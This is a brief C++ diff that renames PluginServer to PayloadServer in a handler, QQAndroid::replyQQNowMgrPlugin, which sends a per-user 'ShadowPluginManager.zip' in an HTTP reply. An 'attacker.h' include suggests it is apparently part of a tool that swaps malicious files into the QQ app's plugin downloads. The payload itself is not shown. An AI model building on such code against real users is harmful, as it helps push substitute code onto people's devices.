@@ -8,7 +8,7 @@
 #include "../HttpUtils.h"
 #include "../attacker.h"
 #include "../version.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 
 
@@ -90,7 +90,7 @@ int QQAndroid::replyQQNowMgrPlugin(char * dstbuf, int dstbufsize, int dstbuflimi
 
 	string filename = Public::getUserUrl(lphttp->username, "ShadowPluginManager.zip");
 
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 	return 0;
 }
 
